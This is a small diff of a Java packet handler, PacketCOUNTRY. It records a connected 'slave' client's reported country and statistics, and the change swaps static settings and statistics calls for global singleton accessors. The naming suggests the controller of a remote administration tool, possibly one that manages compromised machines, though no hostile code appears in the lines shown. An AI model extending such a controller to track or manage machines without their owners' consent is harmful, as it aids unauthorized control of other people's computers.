@@ -12,7 +12,7 @@ public class PacketCOUNTRY extends Packet {
 	public void read(Slave slave, String line) throws Exception {
 		String country = slave.readLine().toLowerCase();
 		
-		if (!Settings.getBoolean("geoip")) {
+		if (!Settings.getGlobal().getBoolean("geoip")) {
 			slave.setCountry(country);	
 			
 			int row = Util.getRow(slave);
@@ -23,7 +23,7 @@ public class PacketCOUNTRY extends Packet {
 			}
 		}
 		
-		Statistics.add(slave);
+		Statistics.getGlobal().add(slave);
 	}
 
 }
